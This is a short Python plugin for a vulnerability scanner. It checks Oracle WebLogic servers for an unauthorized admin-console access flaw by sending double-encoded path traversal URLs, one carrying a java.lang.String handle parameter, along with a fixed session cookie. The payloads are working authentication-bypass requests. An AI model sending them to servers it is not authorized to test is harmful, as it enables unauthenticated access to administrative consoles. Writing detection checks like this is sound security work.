# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "name": "Weblogic未授权访问漏洞",
        "references": ["-"],
        "description": "利用该漏洞，未授权的用户可以绕过管理控制台的权限验证访问后台",
    }

    def url(self) -> dict:
        for path in [
            './console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")',
            './console/css/%252e%252e%252fconsole.portal'
        ]:
            r = self.request(
                method='get',
                path=path,
                timeout=15,
                headers={
                    "Cookie": "ADMINCONSOLESESSION=y9FwZ5B69_YCeUlWZkDdAPLbLz7WwbXUDTLANNJxDacI9o-l0iHf!13166000"
                },
            )
            if 'quicklinksrowout' in r.text:
                return {
                    "LoopholeInfo": {"app": "Weblogic", "name": "Weblogic未授权访问漏洞"}
                }
